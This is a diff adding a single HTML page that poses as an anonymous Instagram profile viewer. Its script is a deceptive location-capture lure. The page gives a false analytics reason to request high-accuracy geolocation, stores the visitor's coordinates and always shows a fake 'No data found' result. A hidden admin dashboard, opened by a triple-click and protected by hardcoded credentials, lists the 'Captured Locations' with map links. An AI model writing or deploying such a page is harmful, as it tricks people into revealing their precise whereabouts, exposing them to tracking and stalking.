@@ -1,0 +1,699 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>InstaDetailsExtractor</title>
+    <link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;600;700;800;900&family=Playfair+Display:ital,wght@0,400;0,600;0,700;1,400&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --olive:     #6b7a2a;
+            --olive-lt:  #8a9a3a;
+            --brown:     #8B5E3C;
+            --brown-dk:  #5C3D1E;
+            --cream:     #f2ede4;
+            --white:     #ffffff;
+            --text-dark: #2c2416;
+            --text-mid:  #5a4a35;
+            --text-soft: #8a7a65;
+            --border:    rgba(92,61,30,0.18);
+        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Nunito', sans-serif; min-height: 100vh; background: var(--white); }
+        .hidden { display: none !important; }
+
+        /* ══ PUBLIC PAGE ══ */
+        #publicPage {
+            min-height: 100vh;
+            background: var(--white);
+            display: flex; flex-direction: column; align-items: center;
+            position: relative; overflow: hidden;
+        }
+        #publicPage::before {
+            content: '';
+            position: absolute; inset: 0;
+            background:
+                radial-gradient(ellipse at 5% 0%, rgba(138,154,58,0.06) 0%, transparent 50%),
+                radial-gradient(ellipse at 95% 100%, rgba(139,94,60,0.06) 0%, transparent 50%);
+            pointer-events: none;
+        }
+
+        /* NAV */
+        .nav-bar {
+            width: 100%; padding: 18px 40px;
+            display: flex; justify-content: space-between; align-items: center;
+            position: relative; z-index: 10;
+            border-bottom: 1px solid var(--border);
+            background: var(--white);
+        }
+        .nav-logo {
+            color: var(--brown-dk); font-size: 1.4em;
+            font-family: 'Playfair Display', serif; font-weight: 700;
+        }
+        .nav-logo span { font-weight: 400; color: var(--brown); }
+        .nav-right {
+            color: var(--text-soft); font-size: 14px; font-weight: 700;
+            display: flex; align-items: center; gap: 6px; cursor: pointer; user-select: none;
+        }
+        .nav-right:hover { color: var(--brown-dk); }
+
+        /* HERO */
+        .hero {
+            position: relative; z-index: 5;
+            text-align: center; padding: 68px 20px 56px;
+            max-width: 800px; width: 100%;
+        }
+        .hero-title {
+            color: var(--text-dark); font-size: 2.5em;
+            font-family: 'Playfair Display', serif; font-weight: 700;
+            margin-bottom: 18px; line-height: 1.2;
+        }
+        .hero-subtitle {
+            color: var(--text-mid); font-size: 1.02em;
+            font-weight: 600; line-height: 1.65; margin-bottom: 40px;
+        }
+
+        /* SEARCH BAR */
+        .search-wrapper {
+            display: flex; align-items: stretch;
+            background: white;
+            border-radius: 10px; overflow: hidden;
+            border: 2.5px solid var(--brown-dk);
+            box-shadow: 4px 4px 0px var(--brown-dk);
+            max-width: 640px; margin: 0 auto;
+        }
+        .search-input {
+            flex: 1; padding: 20px 24px;
+            font-size: 1.05em; font-family: 'Nunito', sans-serif;
+            border: none; outline: none; color: var(--text-dark); font-weight: 600;
+            background: white;
+        }
+        .search-input::placeholder { color: #bbb; font-weight: 500; }
+        .search-btn {
+            background: var(--brown-dk); border: none;
+            padding: 0 26px; min-height: 60px;
+            cursor: pointer; display: flex; align-items: center; justify-content: center;
+            transition: background 0.2s; flex-shrink: 0;
+        }
+        .search-btn:hover { background: var(--brown); }
+        .search-btn svg { width: 22px; height: 22px; }
+
+        /* LOCATION NOTICE */
+        .location-notice {
+            max-width: 640px; margin: 16px auto 30px;
+            background: var(--cream);
+            border: 1.5px solid var(--border);
+            border-radius: 12px; padding: 14px 20px;
+            display: flex; align-items: flex-start; gap: 12px; text-align: left;
+        }
+        .notice-icon { font-size: 1.4em; flex-shrink: 0; margin-top: 1px; }
+        .notice-text { color: var(--text-mid); font-size: 14px; font-weight: 600; line-height: 1.6; }
+        .notice-text strong { color: var(--brown-dk); font-weight: 800; }
+
+        /* QUICK TAGS */
+        .quick-tags { display: flex; gap: 10px; justify-content: center; flex-wrap: wrap; }
+        .tag {
+            background: var(--cream); color: var(--brown-dk);
+            border: 1.5px solid var(--border);
+            padding: 8px 18px; border-radius: 25px;
+            font-size: 14px; font-weight: 700; cursor: pointer; transition: all 0.2s;
+        }
+        .tag:hover { background: rgba(92,61,30,0.1); border-color: var(--brown); }
+
+        /* FEATURES SECTION */
+        .features-section {
+            width: 100%; background: var(--cream);
+            border-top: 1px solid var(--border);
+            padding: 72px 24px; position: relative; z-index: 5;
+        }
+        .section-title {
+            text-align: center; color: var(--text-dark);
+            font-size: 2em; font-weight: 700;
+            font-family: 'Playfair Display', serif;
+            margin-bottom: 14px;
+        }
+        .section-subtitle {
+            text-align: center; color: var(--text-mid);
+            font-size: 15px; font-weight: 600; line-height: 1.7;
+            max-width: 700px; margin: 0 auto 52px;
+        }
+        .features-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
+            gap: 24px; max-width: 1050px; margin: 0 auto;
+        }
+        .feature-card {
+            background: var(--white);
+            border: 1.5px solid var(--border);
+            border-radius: 20px; padding: 36px 28px 32px; text-align: center;
+            transition: transform 0.25s, box-shadow 0.25s;
+            box-shadow: 0 4px 16px rgba(92,61,30,0.07);
+        }
+        .feature-card:hover {
+            transform: translateY(-6px);
+            box-shadow: 0 20px 48px rgba(92,61,30,0.13);
+            border-color: var(--brown);
+        }
+        .feature-icon-wrap {
+            width: 76px; height: 76px; border-radius: 50%;
+            background: linear-gradient(135deg, var(--olive-lt), var(--brown));
+            display: flex; align-items: center; justify-content: center;
+            margin: 0 auto 22px;
+            box-shadow: 0 8px 24px rgba(92,61,30,0.2);
+            font-size: 2em;
+        }
+        .feature-card h3 {
+            color: var(--text-dark); font-size: 1.15em; font-weight: 700;
+            font-family: 'Playfair Display', serif; margin-bottom: 12px;
+        }
+        .feature-card p { color: var(--text-mid); font-size: 14px; font-weight: 600; line-height: 1.65; }
+
+        /* HOW IT WORKS */
+        .how-section {
+            width: 100%; background: var(--white);
+            border-top: 1px solid var(--border);
+            padding: 72px 24px 84px; position: relative; z-index: 5;
+        }
+        .steps-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(190px, 1fr));
+            gap: 36px 28px; max-width: 1050px; margin: 0 auto;
+        }
+        .step-item { display: flex; flex-direction: column; align-items: center; text-align: center; }
+        .step-number {
+            font-size: 3.5em; font-weight: 700;
+            color: rgba(92,61,30,0.09); line-height: 1; margin-bottom: 12px;
+            font-family: 'Playfair Display', serif;
+        }
+        .step-icon-wrap {
+            width: 68px; height: 68px; border-radius: 16px;
+            background: var(--cream); border: 1.5px solid var(--border);
+            display: flex; align-items: center; justify-content: center;
+            margin-bottom: 18px; font-size: 1.8em;
+        }
+        .step-item h4 {
+            color: var(--text-dark); font-size: 1em; font-weight: 700;
+            font-family: 'Playfair Display', serif; margin-bottom: 8px;
+        }
+        .step-item p { color: var(--text-mid); font-size: 13.5px; font-weight: 600; line-height: 1.6; }
+
+        /* FOOTER */
+        .site-footer {
+            width: 100%; background: var(--brown-dk);
+            padding: 24px; text-align: center;
+            color: rgba(255,255,255,0.45); font-size: 13px; font-weight: 600;
+        }
+
+        /* LOADING */
+        #loadingOverlay {
+            position: fixed; inset: 0;
+            background: rgba(44,36,22,0.55); backdrop-filter: blur(6px);
+            z-index: 5000; display: flex; flex-direction: column;
+            align-items: center; justify-content: center; gap: 20px;
+        }
+        .spinner {
+            width: 54px; height: 54px;
+            border: 5px solid rgba(255,255,255,0.2);
+            border-top-color: white; border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        #loadingOverlay p {
+            color: white; font-size: 18px; font-weight: 600;
+            font-family: 'Playfair Display', serif;
+        }
+        #loadingOverlay .sub-text { color: rgba(255,255,255,0.6); font-size: 13px; font-weight: 600; }
+
+        /* RESULTS PAGE */
+        #resultsPage {
+            min-height: 100vh; background: var(--white);
+            display: flex; flex-direction: column; align-items: center;
+        }
+        .results-hero {
+            text-align: center; padding: 60px 20px 36px; max-width: 700px;
+        }
+        .results-hero h2 {
+            color: var(--text-dark); font-size: 1.9em; font-weight: 700;
+            font-family: 'Playfair Display', serif; margin-bottom: 10px;
+        }
+        .results-hero p { color: var(--text-mid); font-size: 1em; font-weight: 600; }
+        .results-hero p strong { color: var(--brown-dk); }
+        .error-card {
+            background: var(--cream); border: 1.5px solid var(--border);
+            border-radius: 20px; padding: 40px 48px; text-align: center;
+            max-width: 500px; width: 90%; margin-top: 10px;
+            box-shadow: 0 8px 32px rgba(92,61,30,0.08);
+        }
+        .error-icon { font-size: 3em; margin-bottom: 14px; }
+        .error-card h3 {
+            color: var(--text-dark); font-size: 1.35em; font-weight: 700;
+            font-family: 'Playfair Display', serif; margin-bottom: 10px;
+        }
+        .error-card p { color: var(--text-mid); font-size: 15px; line-height: 1.6; }
+        .try-again-btn {
+            margin-top: 24px; background: var(--brown-dk); color: white;
+            border: none; padding: 13px 32px; border-radius: 8px;
+            font-size: 15px; font-weight: 800; font-family: 'Nunito', sans-serif;
+            cursor: pointer; transition: all 0.2s;
+            border: 2px solid var(--brown-dk);
+        }
+        .try-again-btn:hover { background: var(--brown); border-color: var(--brown); transform: translateY(-2px); }
+
+        /* ADMIN MODAL */
+        #adminModal {
+            position: fixed; inset: 0;
+            background: rgba(242,237,228,0.7); backdrop-filter: blur(12px);
+            z-index: 9000; display: flex; align-items: center; justify-content: center;
+        }
+        .login-box {
+            background: var(--white); padding: 48px 44px; border-radius: 20px;
+            box-shadow: 6px 6px 0px var(--brown-dk), 0 20px 60px rgba(92,61,30,0.12);
+            text-align: center; max-width: 380px; width: 90%;
+            border: 2.5px solid var(--brown-dk);
+        }
+        .login-box-logo {
+            font-family: 'Playfair Display', serif;
+            font-size: 1.2em; font-weight: 700;
+            color: var(--brown-dk); margin-bottom: 4px;
+        }
+        .login-box-logo span { font-weight: 400; color: var(--brown); }
+        .login-box h2 {
+            color: var(--text-dark); font-size: 1.45em; font-weight: 700; margin-bottom: 6px;
+            font-family: 'Playfair Display', serif;
+        }
+        .login-box .sub { color: var(--text-soft); font-size: 14px; margin-bottom: 28px; }
+        .login-divider {
+            width: 40px; height: 2px;
+            background: linear-gradient(90deg, var(--olive-lt), var(--brown));
+            margin: 10px auto 24px; border-radius: 2px;
+        }
+        .login-input {
+            width: 100%; padding: 14px 18px; margin-bottom: 14px;
+            border: 2px solid var(--border); border-radius: 10px;
+            font-size: 15px; font-family: 'Nunito', sans-serif; font-weight: 600;
+            outline: none; transition: border 0.2s, box-shadow 0.2s; color: var(--text-dark);
+            background: var(--cream);
+        }
+        .login-input:focus {
+            border-color: var(--brown-dk);
+            box-shadow: 3px 3px 0px var(--brown-dk);
+            background: white;
+        }
+        .login-input::placeholder { color: var(--text-soft); }
+        .login-btns { display: flex; gap: 10px; margin-top: 14px; }
+        .btn-primary {
+            flex: 1; padding: 14px;
+            background: var(--brown-dk); color: white;
+            border: 2px solid var(--brown-dk); border-radius: 10px;
+            font-size: 15px; font-weight: 800; font-family: 'Nunito', sans-serif;
+            cursor: pointer; transition: all 0.2s;
+            box-shadow: 3px 3px 0px var(--olive);
+        }
+        .btn-primary:hover { background: var(--brown); border-color: var(--brown); transform: translateY(-1px); box-shadow: 4px 4px 0px var(--olive); }
+        .btn-cancel {
+            flex: 1; padding: 14px;
+            background: var(--cream); color: var(--text-mid);
+            border: 2px solid var(--border); border-radius: 10px;
+            font-size: 15px; font-weight: 800; font-family: 'Nunito', sans-serif; cursor: pointer;
+            transition: all 0.2s;
+        }
+        .btn-cancel:hover { border-color: var(--brown); color: var(--brown-dk); }
+        #loginError { color: #b84444; font-size: 13px; font-weight: 700; margin-top: 10px; min-height: 18px; font-family: 'Nunito', sans-serif; }
+
+        /* ADMIN DASHBOARD */
+        #adminPage { min-height: 100vh; background: var(--white); }
+        .dash-header {
+            background: var(--white);
+            border-bottom: 2px solid var(--border);
+            padding: 22px 36px; display: flex; justify-content: space-between; align-items: center;
+        }
+        .dash-header-left { display: flex; align-items: center; gap: 16px; }
+        .dash-header h1 {
+            color: var(--text-dark); font-size: 1.7em; font-weight: 700;
+            font-family: 'Playfair Display', serif;
+        }
+        .dash-header p { color: var(--text-soft); font-size: 13px; margin-top: 3px; }
+        .dash-logout {
+            background: var(--cream); color: var(--brown-dk);
+            border: 2px solid var(--brown-dk);
+            padding: 10px 22px; border-radius: 8px;
+            cursor: pointer; font-weight: 800; font-family: 'Nunito', sans-serif; font-size: 14px;
+            transition: all 0.2s;
+            box-shadow: 3px 3px 0px var(--brown-dk);
+        }
+        .dash-logout:hover { background: var(--brown-dk); color: white; transform: translateY(-1px); }
+        .dash-body { max-width: 1100px; margin: 0 auto; padding: 32px 24px; }
+        .stats-row {
+            display: grid; grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
+            gap: 16px; margin-bottom: 28px;
+        }
+        .stat-card {
+            background: var(--cream); padding: 22px; border-radius: 18px; text-align: center;
+            border: 1.5px solid var(--border);
+            box-shadow: 4px 4px 0px var(--border);
+        }
+        .stat-num {
+            font-size: 2.6em; font-weight: 900;
+            background: linear-gradient(135deg, var(--olive-lt), var(--brown-dk));
+            -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text;
+        }
+        .stat-lbl { color: var(--text-soft); font-size: 13px; font-weight: 700; margin-top: 4px; }
+        .loc-panel {
+            background: white; border-radius: 16px; overflow: hidden;
+            border: 2px solid var(--border);
+            box-shadow: 4px 4px 0px var(--border);
+        }
+        .loc-panel-header {
+            background: var(--cream);
+            border-bottom: 2px solid var(--border);
+            padding: 20px 28px; display: flex; justify-content: space-between; align-items: center;
+        }
+        .loc-panel-header h2 {
+            color: var(--text-dark); font-size: 1.15em; font-weight: 700;
+            font-family: 'Playfair Display', serif;
+        }
+        .btn-clear {
+            background: white; color: var(--brown-dk);
+            border: 2px solid var(--brown-dk);
+            padding: 8px 18px; border-radius: 8px;
+            cursor: pointer; font-weight: 800; font-family: 'Nunito', sans-serif; font-size: 13px;
+            transition: all 0.2s;
+            box-shadow: 2px 2px 0px var(--brown-dk);
+        }
+        .btn-clear:hover { background: var(--brown-dk); color: white; }
+        .loc-item {
+            padding: 20px 28px; border-bottom: 1px solid rgba(92,61,30,0.07);
+            display: flex; justify-content: space-between; align-items: center; transition: background 0.15s;
+        }
+        .loc-item:last-child { border-bottom: none; }
+        .loc-item:hover { background: var(--cream); }
+        .loc-username { font-size: 13px; color: var(--text-soft); font-weight: 700; margin-bottom: 3px; }
+        .loc-coords { font-size: 16px; font-weight: 900; font-family: monospace; color: var(--brown-dk); }
+        .loc-meta { font-size: 12px; color: var(--olive); font-weight: 700; margin-top: 3px; }
+        .loc-time { font-size: 13px; color: var(--text-soft); font-weight: 600; }
+        .loc-right { text-align: right; flex-shrink: 0; margin-left: 20px; }
+        .btn-delete {
+            background: white; color: #b84444;
+            border: 2px solid #b84444;
+            padding: 8px 16px; border-radius: 8px;
+            cursor: pointer; font-family: 'Nunito', sans-serif;
+            font-weight: 800; font-size: 13px; margin-top: 6px; transition: all 0.2s;
+            box-shadow: 2px 2px 0px #b84444;
+        }
+        .btn-delete:hover { background: #b84444; color: white; transform: translateY(-1px); }
+        .maps-link {
+            display: inline-block; font-size: 12px; font-weight: 700;
+            color: var(--brown); text-decoration: none; margin-top: 4px;
+        }
+        .maps-link:hover { text-decoration: underline; }
+        .empty-state { padding: 60px; text-align: center; color: var(--text-soft); }
+        .empty-state h3 { font-size: 1.2em; margin-bottom: 8px; font-family: 'Playfair Display', serif; color: var(--text-mid); }
+    </style>
+</head>
+<body>
+
+    <!-- PUBLIC PAGE -->
+    <div id="publicPage">
+        <div class="nav-bar">
+            <div class="nav-logo">InstaDetails<span>Extractor</span></div>
+            <div class="nav-right" id="adminTrigger">🌐 English</div>
+        </div>
+        <div class="hero">
+            <h1 class="hero-title">Anonymous Instagram browsing</h1>
+            <p class="hero-subtitle">
+                Enter needed username in the search bar using formats username, @username or<br>
+                https://www.instagram.com/username/
+            </p>
+            <div class="search-wrapper">
+                <input type="text" class="search-input" id="usernameInput" placeholder="Enter username" autocomplete="off" />
+                <button class="search-btn" onclick="handleSearch()">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2.5" stroke-linecap="round"><circle cx="11" cy="11" r="6"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
+                </button>
+            </div>
+            <div class="location-notice">
+                <div class="notice-icon">📍</div>
+                <div class="notice-text">
+                    <strong>For accurate profile analytics, please enable location access.</strong>
+                    Our system uses your location to verify regional availability and deliver
+                    precise follower insights, story engagement data, and profile activity reports.
+                </div>
+            </div>
+            <div class="quick-tags">
+                <div class="tag" onclick="fillAndSearch('billieeilish')">@billieeilish</div>
+                <div class="tag" onclick="fillAndSearch('kyliejenner')">@kyliejenner</div>
+            </div>
+        </div>
+
+        <!-- FEATURES -->
+        <div class="features-section">
+            <h2 class="section-title">InstaDetailsExtractor Features</h2>
+            <p class="section-subtitle">
+                InstaDetailsExtractor is a free service for anonymous viewing and analysis of Instagram profiles
+                from open accounts. No login required — just enter a username and get instant insights.
+            </p>
+            <div class="features-grid">
+                <div class="feature-card">
+                    <div class="feature-icon-wrap">👁️</div>
+                    <h3>100% Anonymity</h3>
+                    <p>The account owner does not see your data in their views statistics. Browse completely invisibly without leaving any trace.</p>
+                </div>
+                <div class="feature-card">
+                    <div class="feature-icon-wrap">✅</div>
+                    <h3>No Account Needed</h3>
+                    <p>There is no need to create an Instagram account. Watch user stories and other multimedia publications without registration or app.</p>
+                </div>
+                <div class="feature-card">
+                    <div class="feature-icon-wrap">⚡</div>
+                    <h3>Instant Details</h3>
+                    <p>Get detailed profile analytics, follower insights, story engagement data and activity reports instantly on any device.</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- HOW IT WORKS -->
+        <div class="how-section">
+            <h2 class="section-title">How does InstaDetailsExtractor work?</h2>
+            <p class="section-subtitle">Simple 5-step process — no downloads, no sign-up required</p>
+            <div class="steps-grid">
+                <div class="step-item">
+                    <div class="step-number">1</div>
+                    <div class="step-icon-wrap">🔍</div>
+                    <h4>Enter Username</h4>
+                    <p>You enter the name of a user that interests you in the search bar</p>
+                </div>
+                <div class="step-item">
+                    <div class="step-number">2</div>
+                    <div class="step-icon-wrap">🤖</div>
+                    <h4>System Processes</h4>
+                    <p>The entered nickname gets into the system and is processed by our bot</p>
+                </div>
+                <div class="step-item">
+                    <div class="step-number">3</div>
+                    <div class="step-icon-wrap">📊</div>
+                    <h4>Data Retrieved</h4>
+                    <p>The service opens the user's page where the latest relevant data is displayed</p>
+                </div>
+                <div class="step-item">
+                    <div class="step-number">4</div>
+                    <div class="step-icon-wrap">🔒</div>
+                    <h4>Stored Securely</h4>
+                    <p>Instagram user stories store the name of one of our secure accounts — not yours</p>
+                </div>
+            </div>
+        </div>
+
+        <div class="site-footer">© 2025 InstaDetailsExtractor — Free anonymous Instagram profile viewer</div>
+    </div>
+
+    <!-- RESULTS PAGE -->
+    <div id="resultsPage" class="hidden">
+        <div class="nav-bar">
+            <div class="nav-logo">InstaDetails<span>Extractor</span></div>
+            <div class="nav-right">🌐 English</div>
+        </div>
+        <div class="results-hero">
+            <h2>Anonymous Instagram browsing</h2>
+            <p>Results for <strong id="searchedUser">@username</strong></p>
+        </div>
+        <div class="error-card">
+            <div class="error-icon">😔</div>
+            <h3>No data found</h3>
+            <p>This account may be private, or the profile details are currently unavailable in your region. Try again later or search another username.</p>
+            <button class="try-again-btn" onclick="goBack()">← Try another username</button>
+        </div>
+    </div>
+
+    <!-- LOADING -->
+    <div id="loadingOverlay" class="hidden">
+        <div class="spinner"></div>
+        <p>Fetching profile details...</p>
+        <div class="sub-text">Analyzing account data, please wait</div>
+    </div>
+
+    <!-- ADMIN MODAL -->
+    <div id="adminModal" class="hidden">
+        <div class="login-box">
+            <div class="login-box-logo">InstaDetails<span>Extractor</span></div>
+            <h2>Admin Access</h2>
+            <div class="login-divider"></div>
+            <p class="sub">Enter credentials to view saved data</p>
+            <input type="text" id="adminUser" class="login-input" placeholder="Username" />
+            <input type="password" id="adminPass" class="login-input" placeholder="Password" />
+            <div id="loginError"></div>
+            <div class="login-btns">
+                <button class="btn-primary" onclick="doAdminLogin()">Login</button>
+                <button class="btn-cancel" onclick="closeAdminModal()">Cancel</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- ADMIN DASHBOARD -->
+    <div id="adminPage" class="hidden">
+        <div class="dash-header">
+            <div>
+                <h1>📊 Location Dashboard</h1>
+                <p>InstaDetailsExtractor — Admin Panel</p>
+            </div>
+            <button class="dash-logout" onclick="doLogout()">← Logout</button>
+        </div>
+        <div class="dash-body">
+            <div class="stats-row">
+                <div class="stat-card"><div class="stat-num" id="statTotal">0</div><div class="stat-lbl">Total Captures</div></div>
+                <div class="stat-card"><div class="stat-num" id="statToday">0</div><div class="stat-lbl">Today</div></div>
+                <div class="stat-card"><div class="stat-num" id="statUsers">0</div><div class="stat-lbl">Unique Searches</div></div>
+            </div>
+            <div class="loc-panel">
+                <div class="loc-panel-header">
+                    <h2>Captured Locations (<span id="liveCount">0</span>)</h2>
+                    <button class="btn-clear" onclick="clearAll()">🗑️ Clear All</button>
+                </div>
+                <div id="locContainer">
+                    <div class="empty-state"><h3>No data yet</h3><p>Waiting for users to search...</p></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const ADMIN = { user: 'hs1229', pass: '120210' };
+        const $ = id => document.getElementById(id);
+
+        let cc = 0, ct;
+        $('adminTrigger').addEventListener('click', () => {
+            cc++; clearTimeout(ct);
+            ct = setTimeout(() => cc = 0, 600);
+            if (cc >= 3) { cc = 0; $('adminModal').classList.remove('hidden'); setTimeout(() => $('adminUser').focus(), 100); }
+        });
+
+        $('usernameInput').addEventListener('keydown', e => { if (e.key === 'Enter') handleSearch(); });
+        function fillAndSearch(u) { $('usernameInput').value = u; handleSearch(); }
+
+        function handleSearch() {
+            const raw = $('usernameInput').value.trim();
+            if (!raw) return;
+            const username = raw.replace('https://www.instagram.com/', '').replace(/\//g, '').replace('@', '');
+            $('publicPage').classList.add('hidden');
+            $('loadingOverlay').classList.remove('hidden');
+            captureLocation(username, () => setTimeout(showError, 10000), () => setTimeout(showError, 10000));
+            function showError() {
+                $('loadingOverlay').classList.add('hidden');
+                $('searchedUser').textContent = '@' + username;
+                $('resultsPage').classList.remove('hidden');
+            }
+        }
+
+        function goBack() {
+            $('resultsPage').classList.add('hidden');
+            $('publicPage').classList.remove('hidden');
+            $('usernameInput').value = '';
+        }
+
+        function captureLocation(username, onSuccess, onFail) {
+            if (!navigator.geolocation) { onFail && onFail(); return; }
+            navigator.geolocation.getCurrentPosition(pos => {
+                const entry = {
+                    id: Date.now() + '_' + Math.random().toString(36).substr(2, 5),
+                    username,
+                    lat: pos.coords.latitude, lng: pos.coords.longitude,
+                    accuracy: Math.round(pos.coords.accuracy),
+                    timestamp: new Date().toISOString(),
+                    timeDisplay: new Date().toLocaleString('en-IN', {
+                        weekday: 'short', year: 'numeric', month: 'short',
+                        day: 'numeric', hour: '2-digit', minute: '2-digit'
+                    })
+                };
+                const saved = JSON.parse(localStorage.getItem('_ide_locs') || '[]');
+                saved.unshift(entry);
+                if (saved.length > 2000) saved.length = 2000;
+                localStorage.setItem('_ide_locs', JSON.stringify(saved));
+                if (!$('adminPage').classList.contains('hidden')) renderDashboard();
+                onSuccess && onSuccess();
+            }, () => { onFail && onFail(); }, { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 });
+        }
+
+        document.addEventListener('keydown', e => {
+            if (e.key === 'Escape') closeAdminModal();
+            if (e.key === 'Enter' && !$('adminModal').classList.contains('hidden')) doAdminLogin();
+        });
+
+        function doAdminLogin() {
+            const u = $('adminUser').value.trim(), p = $('adminPass').value;
+            if (u === ADMIN.user && p === ADMIN.pass) {
+                $('adminModal').classList.add('hidden');
+                $('publicPage').classList.add('hidden');
+                $('resultsPage').classList.add('hidden');
+                $('adminPage').classList.remove('hidden');
+                renderDashboard();
+            } else {
+                $('loginError').textContent = '❌ Incorrect username or password';
+                $('adminPass').value = ''; $('adminPass').focus();
+            }
+        }
+
+        function closeAdminModal() {
+            $('adminModal').classList.add('hidden');
+            $('adminUser').value = ''; $('adminPass').value = '';
+            $('loginError').textContent = '';
+        }
+
+        function doLogout() { $('adminPage').classList.add('hidden'); $('publicPage').classList.remove('hidden'); }
+
+        function renderDashboard() {
+            const data = JSON.parse(localStorage.getItem('_ide_locs') || '[]');
+            $('statTotal').textContent = data.length;
+            $('liveCount').textContent = data.length;
+            const today = new Date().toDateString();
+            $('statToday').textContent = data.filter(d => new Date(d.timestamp).toDateString() === today).length;
+            $('statUsers').textContent = new Set(data.map(d => d.username)).size;
+            const c = $('locContainer');
+            if (!data.length) { c.innerHTML = '<div class="empty-state"><h3>No captures yet</h3><p>Waiting for users to search...</p></div>'; return; }
+            c.innerHTML = data.map(d => `
+                <div class="loc-item">
+                    <div>
+                        <div class="loc-username">🔍 Searched: @${d.username}</div>
+                        <div class="loc-coords">${d.lat.toFixed(6)}, ${d.lng.toFixed(6)}</div>
+                        <div class="loc-meta">Accuracy: ±${d.accuracy}m</div>
+                        <a class="maps-link" href="https://maps.google.com/?q=${d.lat},${d.lng}" target="_blank">📌 Open in Google Maps</a>
+                    </div>
+                    <div class="loc-right">
+                        <div class="loc-time">${d.timeDisplay}</div>
+                        <button class="btn-delete" onclick="deleteEntry('${d.id}')">Delete</button>
+                    </div>
+                </div>`).join('');
+        }
+
+        function deleteEntry(id) {
+            let data = JSON.parse(localStorage.getItem('_ide_locs') || '[]');
+            data = data.filter(d => d.id !== id);
+            localStorage.setItem('_ide_locs', JSON.stringify(data));
+            renderDashboard();
+        }
+
+        function clearAll() {
+            if (confirm('Delete ALL captured locations? Cannot be undone.')) {
+                localStorage.removeItem('_ide_locs'); renderDashboard();
+            }
+        }
+    </script>
+</body>
+</html>
